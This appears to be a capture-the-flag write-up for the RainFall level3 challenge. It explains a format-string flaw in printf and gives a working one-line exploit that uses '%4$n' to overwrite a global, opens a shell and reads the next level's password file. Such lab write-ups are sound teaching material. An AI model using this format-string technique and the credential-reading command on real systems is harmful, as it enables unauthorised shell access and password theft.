@@ -1,0 +1,21 @@
+# level3 → level4
+
+`v` uses the input as the format string in `printf(input)`. Its global `m`
+is at `0x0804988c`, and `m == 64` opens a shell. On 32-bit x86, the first
+four bytes of the input are `printf`'s fourth apparent argument. `%4$n`
+writes the number of bytes printed so far through that address. The four
+address bytes and 60 `A`s make exactly 64 bytes.
+
+From the level3 account on the RainFall VM:
+
+```sh
+(
+  python2.7 -c 'import struct; print struct.pack("<I",0x0804988c) + "A"*60 + "%4$n"'
+  cat
+) | ./level3
+id
+cat /home/user/level4/.pass
+```
+
+Use `objdump -t ./level3` to locate `m`, and `disassemble v` in GDB to
+confirm the unguarded `printf` and comparison with `0x40`.
